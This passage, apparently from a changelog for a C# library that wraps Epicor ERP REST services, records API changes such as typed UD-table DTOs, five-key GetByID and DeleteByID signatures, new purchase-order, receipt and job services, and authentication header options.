- `EXAMPLES_EPICOR.md` brought in line with the 0.2.1 API: five-string `GetByIDAsync`/`DeleteByIDAsync` call sites, `Key3`–`Key5` defaulting to null, the four typed wrappers, and a corrected `Key1` note.

---

## [0.2.1] — 2026-06-03

### Changed

- **`UDRow.Key3`, `Key4`, and `Key5` no longer default to an empty string.** *Breaking.* These three key segments previously initialized to `""`; they now default to null, matching `Key1` and `Key2` (which were already defaultless as of 0.2.0). The library should not silently invent key values the caller never declared — once a caller is on the typed-DTO path, their DTO is the source of truth for which keys their row has. Null means "unset"; the write path coalesces an unset key to the empty-string form Epicor expects just before the wire (see the *DeleteByID* entry below), so the on-the-wire behavior for a fully-unmapped key is unchanged. The break surfaces only for code that read `Key3`–`Key5` expecting a non-null empty string before setting them.

- **`DeleteByIDAsync(UDRow, string, …)` replaced with `DeleteByIDAsync(string key1, string key2, string key3, string key4, string key5, string UDTable, …)`.** *Breaking.* The five-string signature mirrors `GetByIDAsync`'s five-key identity shape. A `UDRow` is a row-data container; passing one purely to carry a key identity overloaded the type's role, since only its `Key1`–`Key5` were ever read. The old overload is removed outright rather than `[Obsolete]`-deprecated — pre-1.0, with effectively no production adoption, a clean cut is cheaper than a deprecation cycle. Each key is coalesced from null to an empty string immediately before the request is built, local to the write path rather than via a converter on the type. `UDTable` remains required with no default (a delete must act on exactly the table named). Internal callers `UpdateAsync(…, delete: true)` and `TruncateAsync` were updated to the new signature.

- **`GetByIDAsync(UDRow, string, …)` replaced with `GetByIDAsync(string key1, string key2, string key3, string key4, string key5, string UDTable = null, …)`.** *Breaking.* Mirrors the new five-string `DeleteByIDAsync` so the two single-row identity methods take the same parameter shape — and matches Epicor's own `GetByID` contract, which takes five flat key values. Same rationale as the delete change: a `UDRow` only ever surrendered its `Key1`–`Key5` here, so the row type was doing identity-stub duty it was never meant for. The old overload is removed, not deprecated. The one deliberate difference from delete: `UDTable` stays optional and falls back to `UDTableDefault`, because a read against the wrong table is recoverable where a delete is not. Day-to-day callers should prefer the typed `GetByIDAsync<T>`, whose external signature is unchanged — only its internal delegation now targets the five-string raw method.

### Added

- **`DeleteByIDAsync<T>(T dto, string UDTable, …)` — typed-DTO single-row delete.** Completes the typed-DTO surface for the destructive path, alongside the existing `SaveAsync<T>`, `GetByIDAsync<T>`, and `QueryAsync<T>`. Reads the DTO's mapped `Key1`–`Key5` values through the existing `UDTableMapping<T>` infrastructure and delegates to the raw five-string `DeleteByIDAsync`. Keys the DTO does not map flow through as null and are coalesced to empty strings at the wire. `UDTable` is required with no default, consistent with the destructive-operation rule and with the raw method it wraps. Constrained `where T : class, new()`, matching the other typed wrappers.

---

### Added

- **Typed-DTO API for UD-table access — `SaveAsync<T>`, `GetByIDAsync<T>`, `QueryAsync<T>` on `UDTableSvc`.** Lets callers define their own typed class for a UD-table use case, decorate properties with `[UDTableColumn("Key1")]` / `[UDTableColumn("ShortChar03")]` etc., and call the table using their own type instead of the generic `UDRow`. Three thin wrappers around the underlying raw methods, all generic over the user's DTO type: `SaveAsync<T>` returns `OperationResult<JObject>` matching every other Keri `UpdateAsync`; `GetByIDAsync<T>` takes a `T` with key properties populated and returns the matching row as a fresh `T`; `QueryAsync<T>` takes an optional `T` filter (populated key columns drive the OData `$filter`) and returns `OperationResult<List<T>>`. All three constrained `where T : class, new()`.

  Validation happens at the first use of each DTO type and is cached for subsequent calls. Four rules are enforced: column names must match real properties on `UDRow`, property types must be compatible with the column family (`string` for `Key*`/`Character*`/`ShortChar*`, `int`/`long`/`float`/`double`/`decimal` for `Number*`, `DateTime` or `DateTime?` for `Date*`, `bool` for `CheckBox*`), no two properties may map to the same column, and `Key1` + `Key2` must both be mapped (Epicor identifies UD rows by the composite of all five keys, and those two carry no default on `UDRow`). All errors accumulate into one `InvalidOperationException` so a malformed DTO can be fixed in one pass.

  String values that exceed the target column's storage capacity at save time throw a new `UDTableColumnCapacityException` before the request reaches the wire — the exception carries the offending property name, the column it was mapped to, the value's length, and the column's capacity (50 for `Key*`, 100 for `ShortChar*`, 1000 for `Character*`).

  When a DTO does not map a property to `Character10`, the mapper auto-emits a column-legend string into that column on save, describing the DTO's mapping (e.g. `"Key1:Category|Key2:OrderNum|ShortChar01:CustomerName"`). When a DTO does own `Character10`, the user's value is used unchanged.

  Three new types in `EpicorSvcs/Platform/`: `UDTableColumnAttribute` (public, sealed, `AttributeTargets.Property`), `UDTableColumnCapacityException` (public, sealed, derives from `Exception`), and `UDTableMapping<T>` (internal, sealed, reflection-based, `Lazy<T>`-cached per process). `InternalsVisibleTo` for `KineticRESTIntegrator.Tests` added on `EpicorSvcs.csproj` so the mapper can be unit-tested. New `UDTableSvc.TypedDto.cs` partial-class file holds the three typed wrappers; `UDTableSvc.cs` was promoted to `public partial class` to host the split. See [EXAMPLES_EPICOR.md — Typed UD-table access](EXAMPLES_EPICOR.md#5-typed-ud-table-access) for the full conventions, key-grain levels, and four progressively complete worked DTOs.

- **`ExtraData` round-tripping on typed UD-table DTOs — install-specific custom columns now flow through the typed API.** Matches the existing `ExtraData` pattern on every other Epicor-table DTO (`Customer`, `Part`, `OrderHed`, `UDRow`, etc.): a typed UD-table DTO that declares a property with `[JsonExtensionData]` typed as `IDictionary<string, JToken>` now round-trips Epicor's `_c` suffix custom columns (and anything else the typed properties don't consume) through that property. On save, dictionary entries are emitted as top-level JSON siblings alongside the standard UD columns. On read, columns the typed mapping didn't consume populate the dictionary. The feature is opt-in: DTOs without such a property continue to discard unmodeled columns on the typed projection (the raw data remains accessible via `OperationResult.RawResponse`). The mapper validates the shape at first use — at most one `[JsonExtensionData]` property per DTO, the property must be `IDictionary<string, JToken>` (or the concrete `Dictionary<string, JToken>`), and it must have a public setter. Keys in the user's dictionary that collide with standard UD-column names (e.g. `"ShortChar01"`) are skipped on save so the typed mapping always wins and no duplicate JSON properties are emitted.

- **`UDTableSvc.QueryAsync` — OData `$filter` support on populated string keys.** The renamed `QueryAsync` (see *Changed* below) previously used its filter-row parameter only for `$select` column projection. It now also builds an OData `$filter` from populated `Key1`–`Key5` values, joined with `and`: a filter row with `Key1 = "X"` returns every row whose `Key1` equals `"X"` regardless of the other keys; `Key1 = "X"` + `Key2 = "Y"` narrows further; etc. An unset (null or empty) key contributes no filter on that level — supporting the "narrow by the keys you know" pattern. Non-key columns are not used for filtering, deliberately, to avoid type-default ambiguity (is `Number01 = 0` a filter or an unset default?). The typed `QueryAsync<T>` inherits this behavior through the underlying raw method.

### Changed

- **`UDXSvc` renamed to `UDTableSvc` throughout.** *Breaking.* The `UDX*` prefix was a Keri-invented placeholder where the `X` did no work and read ambiguously as "UD codes" to anyone familiar with Epicor's UD landscape (`UDCodes` is a separate concept, handled by `UserCodesSvc`). The rename is self-explanatory and matches how every other Keri service names itself. Cascades through the codebase: `EpicorSvcs/Platform/UDXSvc.cs` → `UDTableSvc.cs`, class `UDXSvc` → `UDTableSvc`, property `EpicorClient.UDX` → `EpicorClient.UDTable`, backing field `_udx` → `_udTable`, POC file `EpicorSvcPOCs/UdxPoc.cs` → `UDTablePoc.cs`, class `UdxPoc` → `UDTablePoc`, and every documentation reference in `README.md`, `EXAMPLES_EPICOR.md`, `CONTRIBUTING.md`, `UDRow.cs` XML docs, and the test files. Cost is zero in practice — no consumer uses `UDXSvc` for production data yet.

- **`UDXSvc.GetAllAsync` renamed to `UDTableSvc.QueryAsync`.** *Breaking.* `GetAllAsync` was a Keri-invented name that didn't wrap a specific Epicor BO action — it read as "fetch every row, no filter," misleading because the method also accepted filter and projection parameters. `QueryAsync` is more honest: it's an OData query that may filter, that may select columns, that may limit results. Method body initially unchanged in the rename; filter support added separately, listed under *Added* above. The internal call inside `TruncateAsync` (formerly `DeleteAllAsync`, see below) updated to call the renamed method.

- **`UDXSvc.GetByIDAsync` body fixed — now calls Epicor's real `GetByID` BO action.** *Breaking in return type.* The previous implementation did an OData filtered read against the entity set, joining all five keys with `and` in a `$filter` clause. Epicor's real `GetByID` action is a direct BO call: `Ice.BO.{UDTable}Svc/GetByID?key1=...&key2=...&key3=...&key4=...&key5=...`. Same shape as `PartSvc.GetByIDAsync` calls `Erp.BO.PartSvc/GetByID?partNum=...`. The fix calls the real action (GET with query parameters, single round trip). Return type also changes from `OperationResult<List<UDRow>>` to `OperationResult<UDRow>` — singular, matching what the underlying action returns (one row, not a collection). Multi-table response data (attachments, extension tables) remains accessible via `result.RawResponse`. The "partial-key filter" use case is now properly served by the renamed `QueryAsync` (see filter-support entry above).

- **`UDTableSvc.DeleteAllAsync` renamed to `TruncateAsync`, with explicit pre-prod / proof-of-concept framing.** *Breaking.* The method's audience is developers iterating on a UD-table data shape: running write code, inspecting results, deciding the row layout is wrong, wanting a clean slate to try again. The new name signals that more sharply than `DeleteAllAsync` did — "Truncate" reads as "reset this table to empty," matching the test-cleanup intent. The XML doc on the method explicitly notes that it is not appropriate for production tables carrying historical data. The implementation is unchanged — a loop of single-row deletes against the result of `QueryAsync`, which is non-atomic and fine at test-table sizes but a sign the table has graduated past this method's audience for anything larger. The confirmation parameter renamed from `confirmDeleteAllRows` to `confirmTruncate` to match the new method name.

- **`UDRow.Key1` no longer defaults to `"ROW_INDICATOR"` (or anything else).** *Breaking.* The previous default was a Keri-invented placeholder string that read as meaningful but wasn't — a row saved without setting `Key1` carried `"ROW_INDICATOR"` as its category, which would be confusing in production data. The property now has no default initializer, so an unset `Key1` is `null` — matching the existing treatment of `Key2` and signaling clearly that the caller is expected to set it. The class-level XML doc on `UDRow` updated, and the doc comment on the `Key1` property reframed as a "Required (strong suggestion)" convention. The typed-DTO API takes this further by requiring `Key1` and `Key2` to be mapped on every typed DTO. `Key3`–`Key5` retain their `""` defaults — empty string is Epicor's native "no value at this grain level" convention, not magic.

- **`UDRow.Number20` no longer documented as a reserved "checksum" column.** The previous XML doc claimed `Number20` was reserved for a row checksum or hash. The convention was never enforced or used, and the framework provides no helpers for it; the documentation was speculative. `Number20` is now just another `Number*` column. `Date20` and `CheckBox20` remain documented as reserved (the `Date20` default of `DateTime.Now` and `CheckBox20` default of `true` are real, useful conventions for record-keeping). `ShortChar20` remains documented as a reserved column for tag/keyword search.

### Fixed

- **`EpicorClient.UDTable` (formerly `EpicorClient.UDX`) doc comment no longer claims the service handles `UDCodes`.** The doc comment on the facade property described the service as "Generic UD-table service (UD01–UD30, UDcodes, etc.)" — but `UDCodes` is a separate concept handled by `UserCodesSvc`. The doc was misleading new readers into thinking the wrong service answered their UDCodes question. Now reads: "Generic UD-table service — read and write rows across any UD table (UD01–UD30)."

---

### Added

- **`POSvc` — purchase order reads and creation.** Adds the 22nd Epicor service wrapper, filling another conspicuous gap in the purchasing domain — POs were unreachable through the library before this. The class lives in a new `EpicorSvcs/Purchasing/` subfolder and is exposed on `EpicorClient` as `client.PO` under a new "Purchasing services" region. The shipped surface:
  - **Three OData entity-set wrappers:** `POesAsync` (rows of `POHeader` — the Epicor entity set on this service is `POes`, the unusual plural is Epicor's own, matched per the framework convention same as `JobEntries`), `PODetailsAsync` (`PODetail` — PO lines), `PORelsAsync` (`PORel` — schedule releases, the unit a receipt acts on).
  - **Four BO action wrappers:** `GetByIDAsync` (the wide multi-table dataset including `POHeader`, `PODetail`, `PORel`, `POMisc`, tax tables, and more — returned intact as `JObject` per the same pattern as the other `GetByID` wrappers), `GetNewPOHeaderAsync` (template-fetcher; leave `poNum` at the default of `0` to let Epicor auto-assign on save — unlike `JobEntrySvc`, this service has no separate `GetNextPONum` because the server handles numbering inside the create flow), `GetNewPODetailAsync` (line template under an existing PO), and `GetNewPORelAsync` (release template under an existing PO line).
  - **Three DTOs in `EpicorSvcs/Dtos/`:** `POHeader`, `PODetail`, `PORel`. Each models the practical-core columns every install has, with `[JsonExtensionData] ExtraData` for `_c` columns and the many multi-currency cost/tax variants the wide tables carry. Note a quirk: `PODetail` exposes the PO number as `PONUM` (all caps) where `POHeader` and `PORel` use `PONum` (mixed case) — the DTO matches Epicor's casing exactly so JSON deserialization works, the mismatch is on Epicor's side.

  Naming follows the standard convention — class `POSvc` matches `Erp.BO.POSvc`, OData method names match Epicor's entity sets. Orchestrators (multi-line PO creation, drop-ship setup, etc.) are intentionally not in this first cut — the native BO wrappers land first; orchestrators get added as specific needs surface, with the partial-class shape on `POSvc` ready to host a `POSvc.Workflows.cs` file.

- **`JobEntrySvc` — manufacturing job reads, creation, and auto-numbering.** Adds the 21st Epicor service wrapper, filling a conspicuous gap: jobs are central to any manufacturing-floor workflow, and the first 20 services shipped without one. The class lives in a new `EpicorSvcs/Production/` subfolder and is exposed on `EpicorClient` as `client.JobEntry` under a new "Production services" region. The shipped surface:
  - **Four OData entity-set wrappers:** `JobEntriesAsync` (rows of `JobHead` — the Epicor entity set on this service is `JobEntries`, not `JobHeads`, so the method name follows suit), `JobAsmblsAsync` (`JobAsmbl` — BOM tree nodes), `JobMtlsAsync` (`JobMtl` — material requirements), `JobPartsAsync` (`JobPart` — produced-part summaries).
  - **Three BO action wrappers:** `GetByIDAsync` (the wide multi-table dataset including `JobHead`, `JobAsmbl`, `JobOper`, `JobMtl`, `JobProd`, `JobPart`, and more — returned intact as `JObject` per the same pattern as `SalesOrderSvc.GetByIDAsync`), `GetNewJobHeadAsync` (template-fetcher; caller supplies the job number), and `GetNextJobNumAsync` (auto-numbering helper that advances Epicor's company-wide job-number sequence and returns the new number).
  - **Four DTOs in `EpicorSvcs/Dtos/`:** `JobHead`, `JobAsmbl`, `JobMtl`, `JobPart`. Each models the practical-core columns every install has, with `[JsonExtensionData] ExtraData` for `_c` columns. `JobHead` notably models the `UserChar1`–`UserChar4` / `UserDate1`–`UserDate4` / `UserDecimal1`–`UserDecimal2` / `UserInteger1`–`UserInteger2` UD series rather than the `Character01`/`Number01`/`CheckBox01`/`ShortChar01` series used on most other Epicor tables — `JobHead` uses a different UD naming convention. `JobAsmbl` and `JobMtl` deliberately omit the large `TLA`/`TLE`/`LLA`/`LLE` cost-rollup variants and the `Carbon*` emissions-tracking variants; both remain accessible through `ExtraData` if needed.

  Naming follows the standard convention — class `JobEntrySvc` matches `Erp.BO.JobEntrySvc`, OData method names match Epicor's entity sets. `UDXSvc` remains the only documented naming exception. Orchestrators (release/close/complete/dispatch) and the wider job tables (`JobOper`, `JobProd`, `JobOpDtl`, etc.) are intentionally not in this first cut — they get added as specific needs surface, with the partial-class shape on `JobEntrySvc` ready to host a `JobEntrySvc.Workflows.cs` file.

- **`CustomerSvc.GetByIDAsync(string custID)` — wide multi-table dataset reader.** Fills a primitive gap in the Customer surface: the existing `CustomersAsync` was a narrow OData read, and there was no way to fetch the full multi-table customer dataset (header plus addresses, contacts, GLC, tax exemptions, etc.) the way `SalesOrderSvc.GetByIDAsync` and `JobEntrySvc.GetByIDAsync` already did for their domains. The new method follows the same pattern: returns the raw `JObject` dataset; materialize individual rows off `Value["ds"][tableName]` as needed. For the narrower "just fetch the header for a known CustID" case, prefer `CustomersAsync` with a `CustID eq '...'` filter — `GetByIDAsync` does more work (wider response) than that case needs.

- **`VendorSvc.VendorsAsync` and `VendorSvc.GetByIDAsync(int vendorNum)` — vendor-master reads, filling a gap.** Before this change, `VendorSvc` exposed only `VendCntsAsync` (vendor contacts) — there was no way to list vendors themselves or fetch a single vendor's full record through the service. `VendorsAsync` is an OData entity-set wrapper matching the recent `JobEntriesAsync` / `SalesOrdersAsync` shape (`filters` + `select` + `top` parameters with a practical-core default `$select`). `GetByIDAsync` is the wide multi-table dataset reader (vendor header plus `VendorPP` purchase points, `VendCnt` contacts, `VendBank` banking, `VendRemitTo`, `EntityGLC`, `TaxExempt`, and more). New `Vendor` DTO in `EpicorSvcs/Dtos/` models the practical-core vendor master columns — identifiers, primary address, contact info, terms/currency, status flags, and the standard `Number01`/`Number02`/`ShortChar01`/`ShortChar02` UD samples that the vendor schema exposes.

- **Configurable API-key header name.** `RESTAuthenticationObject.ApiKeyHeaderName` controls the HTTP header the API key is sent under. It defaults to `X-API-Key` (what Epicor's v2 OData endpoint expects), so existing behavior is unchanged; callers targeting a REST API that expects a differently-named header (`apikey`, `Ocp-Apim-Subscription-Key`, etc.) can now override it. A blank value falls back to `X-API-Key`.

- **OAuth 2.0 bearer-token authentication.** `RESTAuthenticationObject.BearerToken`, when set, is sent as an `Authorization: Bearer {token}` header. You supply the token; Keri does not acquire or refresh it. Bearer takes precedence over Basic (both use the `Authorization` header); an API key, a separate header, may still be sent alongside.

- **`ExtraData` on every Epicor-table DTO — installation-specific `_c` columns now flow through.** Every DTO that models an Epicor table (`Customer`, `Part`, `OrderHed`, `UDRow`, and ~23 more) carries an `[JsonExtensionData] IDictionary<string, JToken> ExtraData` property. JSON properties the DTO doesn't have a typed field for — most commonly Epicor's `_c`-suffixed custom columns — land in this dictionary on deserialization and are emitted as top-level siblings on serialization. Reads: `part.ExtraData["WarrantyPeriod_c"]`. Writes: `part.ExtraData["WarrantyPeriod_c"] = 12;` — the value round-trips through `JObject.FromObject(part)`. Replaces the previous "use `RawResponse` for custom columns" workaround, which was readable-only and required manual JObject construction. `RawResponse` remains the escape hatch for data that isn't on the row at all (other tables, the wide `GetByID` dataset).

- **Multi-company UD-row writes via `UDRow.Company`.** `UDRow` gains a `Company` property for explicitly targeting a tenant when writing or upserting through `UDXSvc.UpdateAsync`. Leave it at the empty-string default and the session's company is used invisibly — the single-company case is unchanged. Set it to override per-row, e.g. `new UDRow { Key1 = "...", Company = "OTHER", /* ... */ }` — useful when a single session reads or writes across multiple Epicor companies. The resolution follows the same per-call-wins-over-default pattern as `UDTable` over `UDTableDefault`. Scope note: this addresses write paths; multi-company *reads* are not added in this change — the `$select` builder for `GetAllAsync` / `GetByIDAsync` continues to exclude `Company`, and reads still go through the session's company.

- **`ReceiptSvc` — vendor-receipt reads and creation.** Adds the 23rd Epicor service wrapper, completing the purchasing-to-receiving picture: `POSvc` lets you read and create POs, `ReceiptSvc` lets you read and create the receipts against them. The class lives in `EpicorSvcs/Purchasing/` alongside `POSvc` and is exposed on `EpicorClient` as `client.Receipt`. The shipped surface:
  - **Three OData entity-set wrappers:** `ReceiptsAsync` (rows of `RcvHead` — the Epicor entity set on this service is `Receipts`, not `RcvHeads`, matched per the framework's match-Epicor-naming convention), `RcvDtlsAsync` (`RcvDtl` — receipt lines), `RcvHeadAttchesAsync` (`RcvHeadAttch` — receipt header attachments).
  - **Five BO action wrappers:** `GetByIDAsync` (compound key — `vendorNum`, `purPoint`, `packSlip` — passed as query parameters, returns the wide multi-table dataset as `JObject`), `GetNewRcvHeadAsync` (header template-fetcher), `GetNewRcvHeadWithPONumAsync` (header template seeded from an existing PO — the typical pre-receipt-lines flow), `GetNewRcvDtlAsync` (line template under an existing receipt), `GetNewRcvHeadAttchAsync` (attachment template).
  - **Three DTOs in `EpicorSvcs/Dtos/`:** `RcvHead`, `RcvDtl`, `RcvHeadAttch`. Each models the practical-core columns every install has, with `[JsonExtensionData] ExtraData` for `_c` columns and the many computed cost/tax variants the wide tables carry.

  Naming follows the standard convention — class `ReceiptSvc` matches `Erp.BO.ReceiptSvc`, OData method names match Epicor's entity sets. Orchestrators (multi-line receipt entry, inventory posting confirmation, etc.) are intentionally not in this first cut — the native BO wrappers land first, with the partial-class shape on `ReceiptSvc` ready to host a `ReceiptSvc.Workflows.cs` file when specific needs surface.

- **`UpdateAsync` on seven services — the write primitive across the practical-core write surface.** `CustomerSvc`, `JobEntrySvc`, `POSvc`, `ReceiptSvc`, `VendorSvc`, `SalesRepSvc`, and `PaymentEntrySvc` each gained an `UpdateAsync(JObject ds, CancellationToken ct)` method that posts a mutated dataset back to Epicor's `Update` endpoint. All seven have identical shape — they wrap the plain `Update` BO method (not `UpdateExt`); the caller mutates rows in the dataset returned by `GetByIDAsync` (setting `RowMod = "U"` on changed rows, `RowMod = "A"` on new rows) and posts the result here. Each method's XML doc notes what's distinctive about that BO's write — `POSvc` mentions Epicor auto-assigns `PONum` when left at 0, `JobEntrySvc` points callers at `GetNextJobNumAsync` for the new-job number, `ReceiptSvc` mentions the inventory-posting and GL-transaction side effects, the others stay generic. Before this change, only `PartSvc.UpdateAsync` / `UpdateExtAsync`, `SalesOrderSvc.MasterUpdateAsync`, and a few isolated services exposed a write primitive; eight more services were read-only. The library now covers the standard CRUD write across every service where it makes sense.

- **`GetByIDAsync` on `ProjectSvc` and `QuoteSvc` — read primitive completion.** Both services had `UpdateAsync` but no `GetByIDAsync`, an asymmetry that meant a caller could write a project or quote but not read one back through the service. `ProjectSvc.GetByIDAsync(string projectID)` and `QuoteSvc.GetByIDAsync(int quoteNum)` both follow the standard wide-dataset-as-`JObject` pattern that `SalesOrderSvc`, `JobEntrySvc`, `POSvc`, and the others use. To materialize the header row, the docstring on each method points at the relevant DTO with `result.Value["ds"]["Project"][0].ToObject<Project>()` or `result.Value["ds"]["QuoteHed"][0].ToObject<QuoteHed>()`. The narrower "I only need the header" case for `ProjectSvc` is served by `ProjectsAsync` with a `ProjectID eq '...'` filter; `QuoteSvc` does not have an OData entity-set wrapper, so `GetByIDAsync` is the only single-record read for now.

- **OData entity-set wrappers across six services — backfill completing the read surface.** Six new `*sAsync` wrappers landed across five services: `PayMethodsAsync` on `PayMethodSvc`, `PaymentEntriesAsync` on `PaymentEntrySvc`, `SerialNoesAsync` on `SerialNoSvc`, `MiscShipsAsync` on `MiscShipSvc`, and both `QuotesAsync` and `QuoteDtlsAsync` on `QuoteSvc`. Each follows the standard OData-wrapper shape (`filters` / `select` / `top` parameters with a practical-core default `$select`) and returns `OperationResult<List<T>>` against the appropriate DTO. Entity-set names follow Epicor's REST help exactly — note `SerialNoes` (matching the `POes` pattern), `PaymentEntries` (matching `JobEntries`), and `MiscShips` whose entity set returns `MscShpHd` rows (the *header* — not the `MscShpDt` lines, which is a separate child table). `QuoteSvc` is the only service in this batch with both a header and a line wrapper, matching the existing `POSvc` and `ReceiptSvc` pattern. Three DTOs landed alongside: the existing `QuoteHed` DTO expanded from 15 properties to ~50 to cover the practical read surface (identity, dates, status flags, currency/terms, sales funnel, base-currency amounts) on top of the existing write-side OTS fields; new `QuoteDtl` and `MscShpHd` DTOs with the same practical-core pattern. `InvTransferSvc` was deliberately excluded — its BO does not expose an OData entity-set wrapper. This supersedes the "`QuoteSvc` does not have an OData entity-set wrapper" remark in the `GetByIDAsync` bullet above.

### Changed

- **`CustomerSvc.CustomersAsync` signature widened to match the framework's OData entity-set convention.** *Breaking.* The method gained `filters` and `select` parameters and the default `top` changed from `30` to `500`, bringing it in line with `JobEntriesAsync` / `SalesOrdersAsync` / `PartsAsync`. The most consequential change is the new default `$select`: previously the method passed no `$select`, so Epicor returned every column on the row; now a default of `CustNum`/`CustID`/`Name` is applied. **Callers reading any other column off the returned DTOs (`Address1`, `City`, `CurrencyCode`, anything else) will see default values for those properties — no compiler error, just silently empty data.** Migration is one parameter:

  ```csharp
  // Before — returned every column on the row
  var result = await client.Customer.CustomersAsync();

  // After — pass an explicit select list for any columns beyond the default
  var result = await client.Customer.CustomersAsync(
      select: new List<string> { "CustNum", "CustID", "Name", "Address1", "City" });
  ```

  The same change subsumes the deleted `_CustomerByCustIDAsync` (see `### Removed`): `CustomersAsync(filters: new List<string> { "CustID eq 'ACME01'" })` is the direct replacement.

- **`UDXSvc` delete operations now require an explicit table and no longer fall back to `UDTableDefault`.** *Breaking.* The destructive paths previously resolved a missing table through `UDTableDefault`, so a delete with no table named would silently act on whichever table that default pointed at. Deletes now resolve the table strictly: a null, empty, or whitespace table name throws `ArgumentException` before any rows are touched. The read methods are unchanged and still fall back to `UDTableDefault`.
  - `UDXSvc.DeleteByIDAsync` — the `UDTable` parameter lost its `= null` default and is now required. Callers relying on the implicit table must pass it explicitly.
  - `UDXSvc.UpdateAsync` — when called with `delete: true`, the `UDTable` argument is now required and resolved strictly. The upsert path (`delete: false`, the default) is unchanged.

- **`UDXSvc.DeleteAllAsync` now requires explicit confirmation.** *Breaking.* The method gained a required `confirmDeleteAllRows` parameter; it throws `ArgumentException` and deletes nothing unless that argument is `true`. Because the method clears an entire UD table, the gate makes the intent visible at the call site — `DeleteAllAsync("UD22", confirmDeleteAllRows: true)` — and prevents the operation from being invoked by reflex.

- **`Company` moved off `RESTSessionKey` and into the new `EpicorRESTSessionKey`.** *Breaking.* `Company` is a purely Epicor concept — only the Epicor service layer ever read it (to substitute into the v2 OData URL), yet it lived on `RESTSessionKey` in the vendor-agnostic `RESTServices` transport. It has moved to a new subclass `EpicorRESTSessionKey` in `EpicorSvcs.Dtos`, and `RESTServices` is now genuinely vendor-neutral. Callers constructing a session for the Epicor layer must use `EpicorRESTSessionKey`; callers using the transport directly against a non-Epicor API use `RESTSessionKey` as before. Migration is one-line per construction site:

  ```csharp
  // Before
  var session = new RESTSessionKey { Company = "EPIC01", /* ... */ };

  // After
  using EpicorSvcs.Dtos;
  var session = new EpicorRESTSessionKey { Company = "EPIC01", /* ... */ };
  ```

  The `EpicorSvc` and `EpicorClient` programmatic constructors take `EpicorRESTSessionKey`; every service's `Svc(RESTSessionKey)` constructor likewise becomes `Svc(EpicorRESTSessionKey)`.

- **`UDXSvc` no longer restricts UD rows to the standard column set.** Previously, `UpdateAsync`, `GetAllAsync`, and `GetByIDAsync` iterated a hardcoded allowlist of the standard UD columns (`Character01`–`Character10`, `Number01`–`Number20`, `Date01`–`Date20`, `CheckBox01`–`CheckBox20`, `ShortChar01`–`ShortChar20`) when building write payloads and `$select` clauses; columns outside the list were silently dropped. The allowlist existed to protect against typos when callers passed raw `JObject`s, but the typed `UDRow` DTO already provides that protection — and the allowlist also blocked installations that legitimately add custom `_c` columns to UD tables. The list has been replaced with an exclusion of non-column properties (`Key1`–`Key5`, `RowMod`, `Company`, `ExtraData`); every other property on the serialized `UDRow` — including `ExtraData` entries lifted to siblings by `[JsonExtensionData]` — now flows through to Epicor.

- **`Customer` DTO expanded from 4-property starter to ~50 practical-core columns.** The `Customer` DTO previously modeled only `Company`/`CustNum`/`CustID`/`Name` — enough for identification but not enough for any meaningful customer-master read. Expanded to cover identity, sold-to address, bill-to address, sales/shipping/terms defaults, and credit-control settings (`CreditLimit`, `CreditHold`, `CreditHoldDate`, etc.) — the columns a typical customer-master read actually wants. `defaultCustomerSelect` in `CustomerSvc` widened to match, so the default OData read now populates these columns automatically. Deliberately omitted columns that *do* stay in `ExtraData`: per-currency `Doc*`/`Glb*` variants, computed credit totals (`Tot*`/`Fxd*`/`NA*`), country-specific groups (AG/MX/PE/CO/IN/TW/MY/DE), `FF*` freight-forwarder fields, UPS Quantum View, `Demand*` EDI, `Serv*` service fields, feature groups (ACAT/LLLB/LOQ/ELI/WI), display flatteners, and `_c` install-specific columns. The practical-core promise stays: ships only columns every Epicor install has.

- **Method ordering normalized across five services to match the POSvc convention.** `PartSvc`, `SalesRepSvc`, `SalesOrderSvc`, `UDXSvc`, and `EngWorkBenchSvc` had accumulated ordering inconsistencies that made navigation harder: `PartSvc` had `UpdateAsync` and `UpdateExtAsync` 83 lines apart with three unrelated methods between them; `UDXSvc` had `UpdateAsync` listed before any read methods and `GetaNewUDAsync` at the bottom; `SalesRepSvc` had `GetByID` before its OData wrapper; `SalesOrderSvc` had `GetNewOrderDtl` before `GetNewOrderHed` (child before parent). All five reordered to the convention `POSvc` already follows: OData entity-set wrappers → reads (bulk before by-key) → template-fetchers (parent before child) → write primitives → destructives (for `UDXSvc`) → internal process-step methods. Pure reorder — no signatures changed, no bodies changed, no behavior changed. Tests pass unmodified; a git diff per file is large because git sees moved methods as deletions plus additions, but the *.cs files themselves are unchanged except for the order. The convention now applies going forward: new methods slot into their semantic group.

- **`payload` parameter renamed to `ds` on public write methods.** Eight services had `Update`/`UpdateExt`/`CheckPartChanges` methods using `payload` as the JObject parameter name — a stylistic minority against the codebase's dominant `ds` convention (30 uses across 10 files before this change). The rename normalizes `PartSvc.UpdateAsync`/`UpdateExtAsync`/`CheckPartChangesAsync` and the seven new `UpdateAsync` methods (`CustomerSvc`, `JobEntrySvc`, `POSvc`, `ReceiptSvc`, `VendorSvc`, `SalesRepSvc`, `PaymentEntrySvc`) onto `ds`. The choice matches Epicor's own JSON envelope, where the top-level key on `Update` payloads is literally `"ds"`. *Technically breaking* for callers using named-argument syntax — `await client.PO.UpdateAsync(payload: someDataset)` would no longer compile; rename to `ds:` if you hit it. Practically near-zero breakage: positional argument syntax is universal for a first positional parameter on a method with this shape. Two local variables in `PartSvc` (`DuplicatePartAsync`, `PartAttchesAsync`) deliberately kept the name `payload` — they're internal scratch JObjects, not API surface.

- **Workflow methods renamed to use `Create*` and `Add*` verb-first conventions.** *Breaking.* The orchestrator methods in `*Svc.Workflows.cs` files were inconsistently named — some used `New*` (a noun-adjective that reads like "fetch a new template"), one used `GetNew*` (borrowed from the BO-wrapper convention and misleading for a method that persists), one used `Find*` instead of the more idiomatic `Get*`, and one used unusual capitalization (`LookUp` instead of `Lookup`) plus a noun-verb word order. All renamed to a single convention: **`Create*`** for orchestrators that create a top-level entity with no parent, **`Add*`** for orchestrators that create a child entity under an existing parent (tracked by whether the method takes a parent-identifier parameter), and **`Get*`** for reads — including reads that compose multiple BO calls. The renames:

  | Old name | New name | Reason |
  |---|---|---|
  | `NewProjectAsync` | `CreateProjectAsync` | Creates a top-level project. |
  | `NewQuoteHedAsync` | `CreateQuoteAsync` | Creates a top-level quote; the Epicor table name (`QuoteHed`) suffix dropped in favor of the conceptual name. |
  | `NewOrderAsync` | `CreateOrderAsync` | Creates a top-level order. |
  | `NewOrderLineAsync` | `AddOrderLineAsync` | Adds a line under an existing order (takes `orderNum`). |
  | `GetNewPartRevAsync` (workflow) | `AddPartRevAsync` | Adds a revision under an existing part (takes `partNum`). The `GetNew*` prefix was misleading because the method also persists — a true `GetNew*` only fetches a template. |
